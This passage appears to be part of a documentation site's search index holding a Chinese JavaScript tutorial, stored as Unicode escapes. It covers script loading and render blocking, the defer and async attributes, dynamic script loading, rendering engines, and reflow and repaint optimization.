\u5143\u7d20\u5f15\u7528\u4e86\u5916\u90e8\u811a\u672c\uff0c\u5c31\u4e0b\u8f7d\u8be5\u811a\u672c\u518d\u6267\u884c\uff0c\u5426\u5219\u5c31\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u3002 JavaScript \u5f15\u64ce\u6267\u884c\u5b8c\u6bd5\uff0c\u63a7\u5236\u6743\u4ea4\u8fd8\u6e32\u67d3\u5f15\u64ce\uff0c\u6062\u590d\u5f80\u4e0b\u89e3\u6790 HTML \u7f51\u9875\u3002 \u52a0\u8f7d\u5916\u90e8\u811a\u672c\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u6682\u505c\u9875\u9762\u6e32\u67d3\uff0c\u7b49\u5f85\u811a\u672c\u4e0b\u8f7d\u5e76\u6267\u884c\u5b8c\u6210\u540e\uff0c\u518d\u7ee7\u7eed\u6e32\u67d3\u3002\u539f\u56e0\u662f JavaScript \u4ee3\u7801\u53ef\u4ee5\u4fee\u6539 DOM\uff0c\u6240\u4ee5\u5fc5\u987b\u628a\u63a7\u5236\u6743\u8ba9\u7ed9\u5b83\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u590d\u6742\u7684\u7ebf\u7a0b\u7ade\u8d5b\u7684\u95ee\u9898\u3002 \u5982\u679c\u5916\u90e8\u811a\u672c\u52a0\u8f7d\u65f6\u95f4\u5f88\u957f\uff08\u4e00\u76f4\u65e0\u6cd5\u5b8c\u6210\u4e0b\u8f7d\uff09\uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u5c31\u4f1a\u4e00\u76f4\u7b49\u5f85\u811a\u672c\u4e0b\u8f7d\u5b8c\u6210\uff0c\u9020\u6210\u7f51\u9875\u957f\u65f6\u95f4\u5931\u53bb\u54cd\u5e94\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u5448\u73b0\u201c\u5047\u6b7b\u201d\u72b6\u6001\uff0c\u8fd9\u88ab\u79f0\u4e3a\u201c\u963b\u585e\u6548\u5e94\u201d\u3002 \u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u8f83\u597d\u7684\u505a\u6cd5\u662f\u5c06 <script> \u6807\u7b7e\u90fd\u653e\u5728\u9875\u9762\u5e95\u90e8\uff0c\u800c\u4e0d\u662f\u5934\u90e8\u3002\u8fd9\u6837\u5373\u4f7f\u9047\u5230\u811a\u672c\u5931\u53bb\u54cd\u5e94\uff0c\u7f51\u9875\u4e3b\u4f53\u7684\u6e32\u67d3\u4e5f\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u7528\u6237\u81f3\u5c11\u53ef\u4ee5\u770b\u5230\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u9762\u5bf9\u4e00\u5f20\u7a7a\u767d\u7684\u9875\u9762\u3002\u5982\u679c\u67d0\u4e9b\u811a\u672c\u4ee3\u7801\u975e\u5e38\u91cd\u8981\uff0c\u4e00\u5b9a\u8981\u653e\u5728\u9875\u9762\u5934\u90e8\u7684\u8bdd\uff0c\u6700\u597d\u76f4\u63a5\u5c06\u4ee3\u7801\u5199\u5165\u9875\u9762\uff0c\u800c\u4e0d\u662f\u8fde\u63a5\u5916\u90e8\u811a\u672c\u6587\u4ef6\uff0c\u8fd9\u6837\u80fd\u7f29\u77ed\u52a0\u8f7d\u65f6\u95f4\u3002 \u811a\u672c\u6587\u4ef6\u90fd\u653e\u5728\u7f51\u9875\u5c3e\u90e8\u52a0\u8f7d\uff0c\u8fd8\u6709\u4e00\u4e2a\u597d\u5904\u3002\u56e0\u4e3a\u5728 DOM \u7ed3\u6784\u751f\u6210\u4e4b\u524d\u5c31\u8c03\u7528 DOM \u8282\u70b9\uff0cJavaScript \u4f1a\u62a5\u9519\uff0c\u5982\u679c\u811a\u672c\u90fd\u5728\u7f51\u9875\u5c3e\u90e8\u52a0\u8f7d\uff0c\u5c31\u4e0d\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u65f6 DOM \u80af\u5b9a\u5df2\u7ecf\u751f\u6210\u4e86\u3002 1 2 3 4 5 6 7 < head > < script > console . log ( document . body . innerHTML ); </ script > </ head > < body > </ body > \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u65f6\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6b64\u65f6 document.body \u5143\u7d20\u8fd8\u672a\u751f\u6210\u3002 \u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u8bbe\u5b9a DOMContentLoaded \u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 < head > < script > document . addEventListener ( 'DOMContentLoaded' , function ( event ) { console . log ( document . body . innerHTML ); } ); </ script > </ head > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6307\u5b9a DOMContentLoaded \u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u624d\u5f00\u59cb\u6267\u884c\u76f8\u5173\u4ee3\u7801\u3002 DOMContentLoaded \u4e8b\u4ef6\u53ea\u6709\u5728 DOM \u7ed3\u6784\u751f\u6210\u4e4b\u540e\u624d\u4f1a\u89e6\u53d1\u3002 \u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528 <script> \u6807\u7b7e\u7684 onload \u5c5e\u6027\u3002\u5f53 <script> \u6807\u7b7e\u6307\u5b9a\u7684\u5916\u90e8\u811a\u672c\u6587\u4ef6\u4e0b\u8f7d\u548c\u89e3\u6790\u5b8c\u6210\uff0c\u4f1a\u89e6\u53d1\u4e00\u4e2a load \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u628a\u6240\u9700\u6267\u884c\u7684\u4ee3\u7801\uff0c\u653e\u5728\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u91cc\u9762\u3002 1 2 < script src = \"jquery.min.js\" onload = \"console.log(document.body.innerHTML)\" > </ script > \u4f46\u662f\uff0c\u5982\u679c\u5c06\u811a\u672c\u653e\u5728\u9875\u9762\u5e95\u90e8\uff0c\u5c31\u53ef\u4ee5\u5b8c\u5168\u6309\u7167\u6b63\u5e38\u7684\u65b9\u5f0f\u5199\uff0c\u4e0a\u9762\u4e24\u79cd\u65b9\u5f0f\u90fd\u4e0d\u9700\u8981\u3002 1 2 3 4 5 6 < body > <!-- \u5176\u4ed6\u4ee3\u7801 --> < script > console . log ( document . body . innerHTML ); </ script > </ body > \u5982\u679c\u6709\u591a\u4e2a script \u6807\u7b7e\uff0c\u6bd4\u5982\u4e0b\u9762\u8fd9\u6837\u3002 1 2 < script src = \"a.js\" ></ script > < script src = \"b.js\" ></ script > \u6d4f\u89c8\u5668\u4f1a\u540c\u65f6\u5e76\u884c\u4e0b\u8f7d a.js \u548c b.js \uff0c\u4f46\u662f\uff0c\u6267\u884c\u65f6\u4f1a\u4fdd\u8bc1\u5148\u6267\u884c a.js \uff0c\u7136\u540e\u518d\u6267\u884c b.js \uff0c\u5373\u4f7f\u540e\u8005\u5148\u4e0b\u8f7d\u5b8c\u6210\uff0c\u4e5f\u662f\u5982\u6b64\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u811a\u672c\u7684\u6267\u884c\u987a\u5e8f\u7531\u5b83\u4eec\u5728\u9875\u9762\u4e2d\u7684\u51fa\u73b0\u987a\u5e8f\u51b3\u5b9a\uff0c\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u811a\u672c\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u4e0d\u53d7\u5230\u7834\u574f\u3002\u5f53\u7136\uff0c\u52a0\u8f7d\u8fd9\u4e24\u4e2a\u811a\u672c\u90fd\u4f1a\u4ea7\u751f\u201c\u963b\u585e\u6548\u5e94\u201d\uff0c\u5fc5\u987b\u7b49\u5230\u5b83\u4eec\u90fd\u52a0\u8f7d\u5b8c\u6210\uff0c\u6d4f\u89c8\u5668\u624d\u4f1a\u7ee7\u7eed\u9875\u9762\u6e32\u67d3\u3002 \u89e3\u6790\u548c\u6267\u884c CSS\uff0c\u4e5f\u4f1a\u4ea7\u751f\u963b\u585e\u3002Firefox \u6d4f\u89c8\u5668\u4f1a\u7b49\u5230\u811a\u672c\u524d\u9762\u7684\u6240\u6709\u6837\u5f0f\u8868\uff0c\u90fd\u4e0b\u8f7d\u5e76\u89e3\u6790\u5b8c\uff0c\u518d\u6267\u884c\u811a\u672c\uff1bWebkit\u5219\u662f\u4e00\u65e6\u53d1\u73b0\u811a\u672c\u5f15\u7528\u4e86\u6837\u5f0f\uff0c\u5c31\u4f1a\u6682\u505c\u6267\u884c\u811a\u672c\uff0c\u7b49\u5230\u6837\u5f0f\u8868\u4e0b\u8f7d\u5e76\u89e3\u6790\u5b8c\uff0c\u518d\u6062\u590d\u6267\u884c\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e\u6765\u81ea\u540c\u4e00\u4e2a\u57df\u540d\u7684\u8d44\u6e90\uff0c\u6bd4\u5982\u811a\u672c\u6587\u4ef6\u3001\u6837\u5f0f\u8868\u6587\u4ef6\u3001\u56fe\u7247\u6587\u4ef6\u7b49\uff0c\u6d4f\u89c8\u5668\u4e00\u822c\u6709\u9650\u5236\uff0c\u540c\u65f6\u6700\u591a\u4e0b\u8f7d6\uff5e20\u4e2a\u8d44\u6e90\uff0c\u5373\u6700\u591a\u540c\u65f6\u6253\u5f00\u7684 TCP \u8fde\u63a5\u6709\u9650\u5236\uff0c\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u5bf9\u670d\u52a1\u5668\u9020\u6210\u592a\u5927\u538b\u529b\u3002\u5982\u679c\u662f\u6765\u81ea\u4e0d\u540c\u57df\u540d\u7684\u8d44\u6e90\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e2a\u9650\u5236\u3002\u6240\u4ee5\uff0c\u901a\u5e38\u628a\u9759\u6001\u6587\u4ef6\u653e\u5728\u4e0d\u540c\u7684\u57df\u540d\u4e4b\u4e0b\uff0c\u4ee5\u52a0\u5feb\u4e0b\u8f7d\u901f\u5ea6\u3002","title":"\u5de5\u4f5c\u539f\u7406"},{"location":"bom/engine/#defer","text":"\u4e3a\u4e86\u89e3\u51b3\u811a\u672c\u6587\u4ef6\u4e0b\u8f7d\u963b\u585e\u7f51\u9875\u6e32\u67d3\u7684\u95ee\u9898\uff0c\u4e00\u4e2a\u65b9\u6cd5\u662f\u5bf9 <script> \u5143\u7d20\u52a0\u5165 defer \u5c5e\u6027\u3002\u5b83\u7684\u4f5c\u7528\u662f\u5ef6\u8fdf\u811a\u672c\u7684\u6267\u884c\uff0c\u7b49\u5230 DOM \u52a0\u8f7d\u751f\u6210\u540e\uff0c\u518d\u6267\u884c\u811a\u672c\u3002 1 2 < script src = \"a.js\" defer ></ script > < script src = \"b.js\" defer ></ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709\u7b49\u5230 DOM \u52a0\u8f7d\u5b8c\u6210\u540e\uff0c\u624d\u4f1a\u6267\u884c a.js \u548c b.js \u3002 defer \u5c5e\u6027\u7684\u8fd0\u884c\u6d41\u7a0b\u5982\u4e0b\u3002 \u6d4f\u89c8\u5668\u5f00\u59cb\u89e3\u6790 HTML \u7f51\u9875\u3002 \u89e3\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5e26\u6709 defer \u5c5e\u6027\u7684 <script> \u5143\u7d20\u3002 \u6d4f\u89c8\u5668\u7ee7\u7eed\u5f80\u4e0b\u89e3\u6790 HTML \u7f51\u9875\uff0c\u540c\u65f6\u5e76\u884c\u4e0b\u8f7d <script> \u5143\u7d20\u52a0\u8f7d\u7684\u5916\u90e8\u811a\u672c\u3002 \u6d4f\u89c8\u5668\u5b8c\u6210\u89e3\u6790 HTML \u7f51\u9875\uff0c\u6b64\u65f6\u518d\u56de\u8fc7\u5934\u6267\u884c\u5df2\u7ecf\u4e0b\u8f7d\u5b8c\u6210\u7684\u811a\u672c\u3002 \u6709\u4e86 defer \u5c5e\u6027\uff0c\u6d4f\u89c8\u5668\u4e0b\u8f7d\u811a\u672c\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4e0d\u4f1a\u963b\u585e\u9875\u9762\u6e32\u67d3\u3002\u4e0b\u8f7d\u7684\u811a\u672c\u6587\u4ef6\u5728 DOMContentLoaded \u4e8b\u4ef6\u89e6\u53d1\u524d\u6267\u884c\uff08\u5373\u521a\u521a\u8bfb\u53d6\u5b8c </html> \u6807\u7b7e\uff09\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u8bc1\u6267\u884c\u987a\u5e8f\u5c31\u662f\u5b83\u4eec\u5728\u9875\u9762\u4e0a\u51fa\u73b0\u7684\u987a\u5e8f\u3002 \u5bf9\u4e8e\u5185\u7f6e\u800c\u4e0d\u662f\u52a0\u8f7d\u5916\u90e8\u811a\u672c\u7684 script \u6807\u7b7e\uff0c\u4ee5\u53ca\u52a8\u6001\u751f\u6210\u7684 script \u6807\u7b7e\uff0c defer \u5c5e\u6027\u4e0d\u8d77\u4f5c\u7528\u3002\u53e6\u5916\uff0c\u4f7f\u7528 defer \u52a0\u8f7d\u7684\u5916\u90e8\u811a\u672c\u4e0d\u5e94\u8be5\u4f7f\u7528 document.write \u65b9\u6cd5\u3002","title":"defer \u5c5e\u6027"},{"location":"bom/engine/#async","text":"\u89e3\u51b3\u201c\u963b\u585e\u6548\u5e94\u201d\u7684\u53e6\u4e00\u4e2a\u65b9\u6cd5\u662f\u5bf9 <script> \u5143\u7d20\u52a0\u5165 async \u5c5e\u6027\u3002 1 2 < script src = \"a.js\" async ></ script > < script src = \"b.js\" async ></ script > async \u5c5e\u6027\u7684\u4f5c\u7528\u662f\uff0c\u4f7f\u7528\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u4e0b\u8f7d\u811a\u672c\uff0c\u4e0b\u8f7d\u65f6\u4e0d\u4f1a\u963b\u585e\u6e32\u67d3\u3002 \u6d4f\u89c8\u5668\u5f00\u59cb\u89e3\u6790 HTML \u7f51\u9875\u3002 \u89e3\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5e26\u6709 async \u5c5e\u6027\u7684 script \u6807\u7b7e\u3002 \u6d4f\u89c8\u5668\u7ee7\u7eed\u5f80\u4e0b\u89e3\u6790 HTML \u7f51\u9875\uff0c\u540c\u65f6\u5e76\u884c\u4e0b\u8f7d <script> \u6807\u7b7e\u4e2d\u7684\u5916\u90e8\u811a\u672c\u3002 \u811a\u672c\u4e0b\u8f7d\u5b8c\u6210\uff0c\u6d4f\u89c8\u5668\u6682\u505c\u89e3\u6790 HTML \u7f51\u9875\uff0c\u5f00\u59cb\u6267\u884c\u4e0b\u8f7d\u7684\u811a\u672c\u3002 \u811a\u672c\u6267\u884c\u5b8c\u6bd5\uff0c\u6d4f\u89c8\u5668\u6062\u590d\u89e3\u6790 HTML \u7f51\u9875\u3002 async \u5c5e\u6027\u53ef\u4ee5\u4fdd\u8bc1\u811a\u672c\u4e0b\u8f7d\u7684\u540c\u65f6\uff0c\u6d4f\u89c8\u5668\u7ee7\u7eed\u6e32\u67d3\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e00\u65e6\u91c7\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u65e0\u6cd5\u4fdd\u8bc1\u811a\u672c\u7684\u6267\u884c\u987a\u5e8f\u3002\u54ea\u4e2a\u811a\u672c\u5148\u4e0b\u8f7d\u7ed3\u675f\uff0c\u5c31\u5148\u6267\u884c\u90a3\u4e2a\u811a\u672c\u3002\u53e6\u5916\uff0c\u4f7f\u7528 async \u5c5e\u6027\u7684\u811a\u672c\u6587\u4ef6\u91cc\u9762\u7684\u4ee3\u7801\uff0c\u4e0d\u5e94\u8be5\u4f7f\u7528 document.write \u65b9\u6cd5\u3002 defer \u5c5e\u6027\u548c async \u5c5e\u6027\u5230\u5e95\u5e94\u8be5\u4f7f\u7528\u54ea\u4e00\u4e2a\uff1f \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u811a\u672c\u4e4b\u95f4\u6ca1\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u5c31\u4f7f\u7528 async \u5c5e\u6027\uff0c\u5982\u679c\u811a\u672c\u4e4b\u95f4\u6709\u4f9d\u8d56\u5173\u7cfb\uff0c\u5c31\u4f7f\u7528 defer \u5c5e\u6027\u3002\u5982\u679c\u540c\u65f6\u4f7f\u7528 async \u548c defer \u5c5e\u6027\uff0c\u540e\u8005\u4e0d\u8d77\u4f5c\u7528\uff0c\u6d4f\u89c8\u5668\u884c\u4e3a\u7531 async \u5c5e\u6027\u51b3\u5b9a\u3002","title":"async \u5c5e\u6027"},{"location":"bom/engine/#_5","text":"<script> \u5143\u7d20\u8fd8\u53ef\u4ee5\u52a8\u6001\u751f\u6210\uff0c\u751f\u6210\u540e\u518d\u63d2\u5165\u9875\u9762\uff0c\u4ece\u800c\u5b9e\u73b0\u811a\u672c\u7684\u52a8\u6001\u52a0\u8f7d\u3002 1 2 3 4 5 [ 'a.js' , 'b.js' ]. forEach ( function ( src ) { var script = document . createElement ( 'script' ); script . src = src ; document . head . appendChild ( script ); }); \u8fd9\u79cd\u65b9\u6cd5\u7684\u597d\u5904\u662f\uff0c\u52a8\u6001\u751f\u6210\u7684 script \u6807\u7b7e\u4e0d\u4f1a\u963b\u585e\u9875\u9762\u6e32\u67d3\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u9020\u6210\u6d4f\u89c8\u5668\u5047\u6b7b\u3002\u4f46\u662f\u95ee\u9898\u5728\u4e8e\uff0c\u8fd9\u79cd\u65b9\u6cd5\u65e0\u6cd5\u4fdd\u8bc1\u811a\u672c\u7684\u6267\u884c\u987a\u5e8f\uff0c\u54ea\u4e2a\u811a\u672c\u6587\u4ef6\u5148\u4e0b\u8f7d\u5b8c\u6210\uff0c\u5c31\u5148\u6267\u884c\u54ea\u4e2a\u3002 \u5982\u679c\u60f3\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u8bbe\u7f6easync\u5c5e\u6027\u4e3a false \u3002 1 2 3 4 5 6 [ 'a.js' , 'b.js' ]. forEach ( function ( src ) { var script = document . createElement ( 'script' ); script . src = src ; script . async = false ; document . head . appendChild ( script ); }); \u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u963b\u585e\u9875\u9762\u6e32\u67d3\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u8bc1 b.js \u5728 a.js \u540e\u9762\u6267\u884c\u3002\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u6bb5\u4ee3\u7801\u540e\u9762\u52a0\u8f7d\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4f1a\u56e0\u6b64\u90fd\u7b49\u5f85 b.js \u6267\u884c\u5b8c\u6210\u540e\u518d\u6267\u884c\u3002 \u5982\u679c\u60f3\u4e3a\u52a8\u6001\u52a0\u8f7d\u7684\u811a\u672c\u6307\u5b9a\u56de\u8c03\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 function loadScript ( src , done ) { var js = document . createElement ( 'script' ); js . src = src ; js . onload = function () { done (); }; js . onerror = function () { done ( new Error ( 'Failed to load script ' + src )); }; document . head . appendChild ( js ); }","title":"\u811a\u672c\u7684\u52a8\u6001\u52a0\u8f7d"},{"location":"bom/engine/#_6","text":"\u5982\u679c\u4e0d\u6307\u5b9a\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u9ed8\u8ba4\u91c7\u7528 HTTP \u534f\u8bae\u4e0b\u8f7d\u3002 1 < script src = \"example.js\" ></ script > \u4e0a\u9762\u7684 example.js \u9ed8\u8ba4\u5c31\u662f\u91c7\u7528 HTTP \u534f\u8bae\u4e0b\u8f7d\uff0c\u5982\u679c\u8981\u91c7\u7528 HTTPS \u534f\u8bae\u4e0b\u8f7d\uff0c\u5fc5\u9700\u5199\u660e\u3002 1 < script src = \"https://example.js\" ></ script > \u4f46\u662f\u6709\u65f6\u6211\u4eec\u4f1a\u5e0c\u671b\uff0c\u6839\u636e\u9875\u9762\u672c\u8eab\u7684\u534f\u8bae\u6765\u51b3\u5b9a\u52a0\u8f7d\u534f\u8bae\uff0c\u8fd9\u65f6\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002 1 < script src = \"//example.js\" ></ script >","title":"\u52a0\u8f7d\u4f7f\u7528\u7684\u534f\u8bae"},{"location":"bom/engine/#_7","text":"\u6d4f\u89c8\u5668\u7684\u6838\u5fc3\u662f\u4e24\u90e8\u5206\uff1a\u6e32\u67d3\u5f15\u64ce\u548c JavaScript \u89e3\u91ca\u5668\uff08\u53c8\u79f0 JavaScript \u5f15\u64ce\uff09\u3002","title":"\u6d4f\u89c8\u5668\u7684\u7ec4\u6210"},{"location":"bom/engine/#_8","text":"\u6e32\u67d3\u5f15\u64ce\u7684\u4e3b\u8981\u4f5c\u7528\u662f\uff0c\u5c06\u7f51\u9875\u4ee3\u7801\u6e32\u67d3\u4e3a\u7528\u6237\u89c6\u89c9\u53ef\u4ee5\u611f\u77e5\u7684\u5e73\u9762\u6587\u6863\u3002 \u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6709\u4e0d\u540c\u7684\u6e32\u67d3\u5f15\u64ce\u3002 Firefox\uff1aGecko \u5f15\u64ce Safari\uff1aWebKit \u5f15\u64ce Chrome\uff1aBlink \u5f15\u64ce IE: Trident \u5f15\u64ce Edge: EdgeHTML \u5f15\u64ce \u6e32\u67d3\u5f15\u64ce\u5904\u7406\u7f51\u9875\uff0c\u901a\u5e38\u5206\u6210\u56db\u4e2a\u9636\u6bb5\u3002 \u89e3\u6790\u4ee3\u7801\uff1aHTML \u4ee3\u7801\u89e3\u6790\u4e3a DOM\uff0cCSS \u4ee3\u7801\u89e3\u6790\u4e3a CSSOM\uff08CSS Object Model\uff09\u3002 \u5bf9\u8c61\u5408\u6210\uff1a\u5c06 DOM \u548c CSSOM \u5408\u6210\u4e00\u68f5\u6e32\u67d3\u6811\uff08render tree\uff09\u3002 \u5e03\u5c40\uff1a\u8ba1\u7b97\u51fa\u6e32\u67d3\u6811\u7684\u5e03\u5c40\uff08layout\uff09\u3002 \u7ed8\u5236\uff1a\u5c06\u6e32\u67d3\u6811\u7ed8\u5236\u5230\u5c4f\u5e55\u3002 \u4ee5\u4e0a\u56db\u6b65\u5e76\u975e\u4e25\u683c\u6309\u987a\u5e8f\u6267\u884c\uff0c\u5f80\u5f80\u7b2c\u4e00\u6b65\u8fd8\u6ca1\u5b8c\u6210\uff0c\u7b2c\u4e8c\u6b65\u548c\u7b2c\u4e09\u6b65\u5c31\u5df2\u7ecf\u5f00\u59cb\u4e86\u3002\u6240\u4ee5\uff0c\u4f1a\u770b\u5230\u8fd9\u79cd\u60c5\u51b5\uff1a\u7f51\u9875\u7684 HTML \u4ee3\u7801\u8fd8\u6ca1\u4e0b\u8f7d\u5b8c\uff0c\u4f46\u6d4f\u89c8\u5668\u5df2\u7ecf\u663e\u793a\u51fa\u5185\u5bb9\u4e86\u3002","title":"\u6e32\u67d3\u5f15\u64ce"},{"location":"bom/engine/#_9","text":"\u6e32\u67d3\u6811\u8f6c\u6362\u4e3a\u7f51\u9875\u5e03\u5c40\uff0c\u79f0\u4e3a\u201c\u5e03\u5c40\u6d41\u201d\uff08flow\uff09\uff1b\u5e03\u5c40\u663e\u793a\u5230\u9875\u9762\u7684\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u79f0\u4e3a\u201c\u7ed8\u5236\u201d\uff08paint\uff09\u3002\u5b83\u4eec\u90fd\u5177\u6709\u963b\u585e\u6548\u5e94\uff0c\u5e76\u4e14\u4f1a\u8017\u8d39\u5f88\u591a\u65f6\u95f4\u548c\u8ba1\u7b97\u8d44\u6e90\u3002 \u9875\u9762\u751f\u6210\u4ee5\u540e\uff0c\u811a\u672c\u64cd\u4f5c\u548c\u6837\u5f0f\u8868\u64cd\u4f5c\uff0c\u90fd\u4f1a\u89e6\u53d1\u201c\u91cd\u6d41\u201d\uff08reflow\uff09\u548c\u201c\u91cd\u7ed8\u201d\uff08repaint\uff09\u3002\u7528\u6237\u7684\u4e92\u52a8\u4e5f\u4f1a\u89e6\u53d1\u91cd\u6d41\u548c\u91cd\u7ed8\uff0c\u6bd4\u5982\u8bbe\u7f6e\u4e86\u9f20\u6807\u60ac\u505c\uff08 a:hover \uff09\u6548\u679c\u3001\u9875\u9762\u6eda\u52a8\u3001\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u6587\u672c\u3001\u6539\u53d8\u7a97\u53e3\u5927\u5c0f\u7b49\u7b49\u3002 \u91cd\u6d41\u548c\u91cd\u7ed8\u5e76\u4e0d\u4e00\u5b9a\u4e00\u8d77\u53d1\u751f\uff0c\u91cd\u6d41\u5fc5\u7136\u5bfc\u81f4\u91cd\u7ed8\uff0c\u91cd\u7ed8\u4e0d\u4e00\u5b9a\u9700\u8981\u91cd\u6d41\u3002\u6bd4\u5982\u6539\u53d8\u5143\u7d20\u989c\u8272\uff0c\u53ea\u4f1a\u5bfc\u81f4\u91cd\u7ed8\uff0c\u800c\u4e0d\u4f1a\u5bfc\u81f4\u91cd\u6d41\uff1b\u6539\u53d8\u5143\u7d20\u7684\u5e03\u5c40\uff0c\u5219\u4f1a\u5bfc\u81f4\u91cd\u7ed8\u548c\u91cd\u6d41\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6d4f\u89c8\u5668\u4f1a\u667a\u80fd\u5224\u65ad\uff0c\u5c06\u91cd\u6d41\u548c\u91cd\u7ed8\u53ea\u9650\u5236\u5230\u76f8\u5173\u7684\u5b50\u6811\u4e0a\u9762\uff0c\u6700\u5c0f\u5316\u6240\u8017\u8d39\u7684\u4ee3\u4ef7\uff0c\u800c\u4e0d\u4f1a\u5168\u5c40\u91cd\u65b0\u751f\u6210\u7f51\u9875\u3002 \u4f5c\u4e3a\u5f00\u53d1\u8005\uff0c\u5e94\u8be5\u5c3d\u91cf\u8bbe\u6cd5\u964d\u4f4e\u91cd\u7ed8\u7684\u6b21\u6570\u548c\u6210\u672c\u3002\u6bd4\u5982\uff0c\u5c3d\u91cf\u4e0d\u8981\u53d8\u52a8\u9ad8\u5c42\u7684 DOM \u5143\u7d20\uff0c\u800c\u4ee5\u5e95\u5c42 DOM \u5143\u7d20\u7684\u53d8\u52a8\u4ee3\u66ff\uff1b\u518d\u6bd4\u5982\uff0c\u91cd\u7ed8 table \u5e03\u5c40\u548c flex \u5e03\u5c40\uff0c\u5f00\u9500\u90fd\u4f1a\u6bd4\u8f83\u5927\u3002 1 2 3 4 var foo = document . getElementById ( 'foobar' ); foo . style . color = 'blue' ; foo . style . marginTop = '30px' ; \u4e0a\u9762\u7684\u4ee3\u7801\u53ea\u4f1a\u5bfc\u81f4\u4e00\u6b21\u91cd\u7ed8\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u4f1a\u7d2f\u79ef DOM \u53d8\u52a8\uff0c\u7136\u540e\u4e00\u6b21\u6027\u6267\u884c\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u4f18\u5316\u6280\u5de7\u3002 \u8bfb\u53d6 DOM \u6216\u8005\u5199\u5165 DOM\uff0c\u5c3d\u91cf\u5199\u5728\u4e00\u8d77\uff0c\u4e0d\u8981\u6df7\u6742\u3002\u4e0d\u8981\u8bfb\u53d6\u4e00\u4e2a DOM \u8282\u70b9\uff0c\u7136\u540e\u7acb\u523b\u5199\u5165\uff0c\u63a5\u7740\u518d\u8bfb\u53d6\u4e00\u4e2a DOM \u8282\u70b9\u3002 \u7f13\u5b58 DOM \u4fe1\u606f\u3002 \u4e0d\u8981\u4e00\u9879\u4e00\u9879\u5730\u6539\u53d8\u6837\u5f0f\uff0c\u800c\u662f\u4f7f\u7528 CSS class \u4e00\u6b21\u6027\u6539\u53d8\u6837\u5f0f\u3002 \u4f7f\u7528 documentFragment \u64cd\u4f5c DOM \u52a8\u753b\u4f7f\u7528 absolute \u5b9a\u4f4d\u6216 fixed \u5b9a\u4f4d\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5bf9\u5176\u4ed6\u5143\u7d20\u7684\u5f71\u54cd\u3002 \u53ea\u5728\u5fc5\u8981\u65f6\u624d\u663e\u793a\u9690\u85cf\u5143\u7d20\u3002 \u4f7f\u7528 window.requestAnimationFrame() \uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u628a\u4ee3\u7801\u63a8\u8fdf\u5230\u4e0b\u4e00\u6b21\u91cd\u7ed8\u4e4b\u524d\u6267\u884c\uff0c\u800c\u4e0d\u662f\u7acb\u5373\u8981\u6c42\u9875\u9762\u91cd\u7ed8\u3002 \u4f7f\u7528\u865a\u62df DOM\uff08virtual DOM\uff09\u5e93\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a window.requestAnimationFrame() \u5bf9\u6bd4\u6548\u679c\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // \u91cd\u6d41\u4ee3\u4ef7\u9ad8 function doubleHeight ( element ) { var currentHeight = element . clientHeight ; element . style . height = ( currentHeight * 2 ) + 'px' ; } all_my_elements . forEach ( doubleHeight ); // \u91cd\u7ed8\u4ee3\u4ef7\u4f4e function doubleHeight ( element ) { var currentHeight = element . clientHeight ; window . requestAnimationFrame ( function () { element . 